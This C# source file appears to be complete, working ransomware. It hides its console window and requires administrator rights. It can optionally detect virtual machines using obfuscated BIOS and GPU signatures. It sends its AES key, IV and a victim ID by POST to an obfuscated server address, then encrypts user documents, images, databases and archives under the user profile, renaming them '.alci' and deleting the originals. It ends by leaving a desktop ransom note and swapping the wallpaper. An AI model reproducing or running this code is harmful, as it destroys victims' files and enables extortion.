using System;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
using System.Security.Principal;
using System.Net;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Management;
using System.Text;

namespace Morgan
{
    internal class Program
    {

        private static readonly bool DEBUG = false;
        private static readonly bool ANTIVM = false;
        private static readonly string c = "vAjLw4CMuAzLvoDc0RHa";

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private const int SW_HIDE = 0;
        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDCHANGE = 0x02;

        static void Main(string[] args)
        {
            if (!DEBUG)
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);
            }
            Run(args);
        }

        private readonly static List<string> virtualBiosSignatures = new List<string> {
        "lJXY31kV",
        "z80SY9ES",
        "X1kV",
        "0Z2bz9mcjlWT",
        "==gb39mbr5WV",
        "BdkV",
        "=Qnbl1GcvxWZ2VGR",
        "=MHaj9mQ",
        "==AevJEbhVHdylmV",
        "BdkVgQmchRmbhR3U",
        "uVGW",
        "==QVNVUU",
        "u9Wa0FmcvBncvNEI0Z2bz9mcjlWT",
        "zxWZsxWYyFGU",
        "IJWbHByalR3bu5Wa",
        "NZ1S",
        "=UVbvRGINZFS",
        "=AjLw4CM",
        "u9Wa0FmcvBncvNEIlx2YhJ3T"
        };


        private static readonly String SELF_PATH = Assembly.GetExecutingAssembly().Location;
        private static readonly string ENC_PATH = $"C:\\Users\\{Environment.UserName}\\";
        private static readonly String[] EXCLUDED_DIRS =
        {
            $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
            "C:\\Windows\\System32\\drivers",
            "C:\\Windows\\System32\\"
        };

        private static readonly String[] FILE_EXTENSIONS =
        {
             ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".odt",
            ".ods", ".odp", ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff",
            ".svg", ".mp3", ".wav", ".aac", ".flac", ".aiff", ".mp4", ".avi",
            ".mkv", ".mov", ".wmv", ".sql", ".db", ".mdb", ".accdb", ".sqlite",
            ".zip", ".rar", ".7z", ".tar", ".gz", ".exe", ".bat", ".cmd", ".sh",
            ".py", ".java", ".c", ".cpp", ".js", ".html", ".htm", ".css", ".ini",
            ".conf", ".cfg", ".xml", ".json", ".yaml", ".yml", ".pst", ".eml",
            ".msg", ".ost", ".vmdk", ".vhd", ".vdi", ".txt", ".rtf", ".log",
            ".iso", ".ics", ".dat"
        };

        private static readonly Int32 KEY_SIZE = 32;
        private static readonly Int32 BLOCK_SIZE = 16;

        static void Run(string[] args)
        {
            if (ANTIVM && AntiVMGPU())
            {
                Environment.Exit(0);

            }

            if (ANTIVM && AntiVMBios())
            {
                Environment.Exit(0);
            }

            if (!DEBUG && !IsAdmin())
            {
               Environment.Exit(0);
            }

            if (!DEBUG && IsRunning())
            {
                Environment.Exit(0);
            }

            string uid = Guid.NewGuid().ToString();

            GenKeys(out byte[] k, out byte[] v);

            if (!DEBUG) { 
                try { SendP(k, v, uid); } catch { };
            };

            ProFiles(ENC_PATH, k, v);

            if (!DEBUG) { DN(uid); }
            if (!DEBUG) { DownloadImage(); };

            if (DEBUG)
            {
                Console.ReadKey();
            }
        }

        private static void SendP(byte[] k, byte[] v, string id)
        {
            try
            {
                string kh = BitConverter.ToString(k).Replace("-", "").ToLower();
                string ih = BitConverter.ToString(v).Replace("-", "").ToLower();
                string jp = $"{{\"id\": \"{id}\", \"k\": \"{kh}\", \"v\": \"{ih}\"}}";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(GetString(c));
                request.Method = "POST";
                request.ContentType = "application/json";
                using (StreamWriter writer = new StreamWriter(request.GetRequestStream(), Encoding.UTF8))
                {
                    writer.Write(jp);
                }

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                }
            }
            catch
            {
                return;
            }
        }

        private static bool AntiVMBios()
        {
            try
            {
                var searcher = new ManagementObjectSearcher(GetString("T9USC9lMz4WaXBSTPJlRgoCIUNURMV0U"));
                foreach (ManagementObject bios in searcher.Get())
                {
                    string biosName = bios[GetString("==QZtFmT")]?.ToString();
                    string biosManufacturer = bios[GetString("yVmc1R3YhZWduFWT")]?.ToString();
                    string biosVersion = bios[GetString("=42bpNnclZ1UPlkQT9USC10U")]?.ToString();

                    if (biosName != null && biosManufacturer != null && biosVersion != null)
                    {
                        foreach (string signature in virtualBiosSignatures)
                        {
                            if (biosName.IndexOf(GetString(signature), StringComparison.OrdinalIgnoreCase) >= 0 ||
                            biosManufacturer.IndexOf(GetString(signature), StringComparison.OrdinalIgnoreCase) >= 0 ||
                            biosVersion.IndexOf(GetString(signature), StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                return true;
                            }
                        }
                    }
                }
            }
            catch
            {
                return true;
            }
            return false;
        }

        private static bool AntiVMGPU()
        {
            try
            {
                var searcher = new ManagementObjectSearcher(GetString("=IXZsx2byRnbvN0blRWaW9lMz4WaXBSTPJlRgoCIUNURMV0U"));
                foreach (ManagementObject gpu in searcher.Get())
                {
                    string gpuName = gpu[GetString("==QZtFmT")]?.ToString();
                    if (gpuName != null)
                    {
                        foreach (string signature in virtualBiosSignatures)
                        {
                            if (gpuName.IndexOf(GetString(signature), StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                return true;
                            }
                        }
                    }
                }
            }
            catch
            {
                return true;
            }
            return false;
        }

        private static string GetString(string input)
        {
            byte[] data = Convert.FromBase64String(ReverseString(input));
            Console.WriteLine(Encoding.UTF8.GetString(data));
            return Encoding.UTF8.GetString(data);
        }

        private static string ReverseString(string input)
        {
            char[] charArray = input.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }

        private static bool IsRunning()
        {
           try
            {
                string currentProcessName = Process.GetCurrentProcess().ProcessName;
                Process[] processes = Process.GetProcessesByName(currentProcessName);
                return processes.Length > 1;
            } catch
            {
                return false;
            }
        }

        private static bool IsAdmin()
        {
            WindowsIdentity id = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(id);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void DN(string uid)
        {
            String text = $"Your files are encrypted using AES, ur ID: {uid}";
            File.WriteAllText($"C:\\Users\\{Environment.UserName}\\Desktop\\README.txt", text);
        }


        private static void DownloadImage()
        {
            try
            {
                string fileName = Path.GetFileName("wallpaper.png");
                string filepath = Path.Combine(Path.GetTempPath(), fileName);

                using (WebClient client = new WebClient())
                {
                    client.DownloadFile("https://i.imgur.com/tcLXq8Q.png", filepath);
                }

                ChangeWallpaper(filepath);
            } catch
            {
                return;
            }
        }
        private static void ChangeWallpaper(string wallpaperPath)
        {
            try
            {
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                return;
            }
            catch
            {
                return;
            }
        }

        private static bool IsSelf(string path)
        {
            return path.ToLower().Equals(SELF_PATH.ToLower());
        }

        private static bool IsExcluded(string path)
        {
            return EXCLUDED_DIRS.Any(excludedDir =>
                string.Equals(path, excludedDir, StringComparison.OrdinalIgnoreCase));
        }


        private static void ProFiles(string p, byte[] k, byte[] v)
        {
            if (!Directory.Exists(p)) return;
            if (IsExcluded(p)) return;
            var files = Directory.GetFiles(p).Where(file => !IsExcluded(file) && FILE_EXTENSIONS.Contains(Path.GetExtension(file).ToLower()));

            Parallel.ForEach(files, file =>
            {
                try
                {
                    if (!File.Exists(file)) return;
                    if (!FILE_EXTENSIONS.Contains(Path.GetExtension(file).ToLower())) return;
                    if (IsSelf(file)) return;
                    if (!DEBUG)
                    {
                        Enc(file, k, v);
                    }
                    else
                    {
                        Console.WriteLine("[DEBUG] ENC FILE: " + file);
                    }
                } catch { return; };
            });

            var subDirectories = Directory.GetDirectories(p).Where(sb => !IsExcluded(sb));
            Parallel.ForEach(subDirectories, sb =>
            {
                try
                {
                    if (IsExcluded(sb)) return;
                    ProFiles(sb, k, v);
                }
                catch { return; };
            });
        }

        private static void Enc(string p, byte[] k, byte[] v)
        {
            if (!File.Exists(p)) return;
            try
            {
                byte[] f = File.ReadAllBytes(p);
                byte[] ed = ED(f, k, v);
                Console.WriteLine(ed.Length);
                if (ed != null)
                {
                    string ef = p + ".alci";
                    File.WriteAllBytes(ef, ed);
                    File.Delete(p);
                }
            } catch (Exception e) {
                Console.WriteLine(e.ToString());
                return;
            }
        }

        private static byte[] ED(byte[] d, byte[] k, byte[] v)
        {
           try
            {
                using (Aes a = Aes.Create())
                {
                    a.KeySize = KEY_SIZE * 8;
                    a.BlockSize = BLOCK_SIZE * 8;
                    a.Key = k;
                    a.IV = v;
                    a.Mode = CipherMode.CBC;
                    a.Padding = PaddingMode.PKCS7;
                    using (ICryptoTransform encryptor = a.CreateEncryptor(a.Key, a.IV))
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                        {
                            cs.Write(d, 0, d.Length);
                            cs.FlushFinalBlock();
                        }
                        return ms.ToArray();
                    }
                }
            } catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                return null;
            }
        }

        private static void GenKeys(out byte[] k, out byte[] v)
        {
            using (var a = Aes.Create())
            {
                a.KeySize = KEY_SIZE * 8;
                a.BlockSize = BLOCK_SIZE * 8;

                a.GenerateKey();
                a.GenerateIV();

                k = a.Key;
                v = a.IV;
            }
        }
        
    }
}
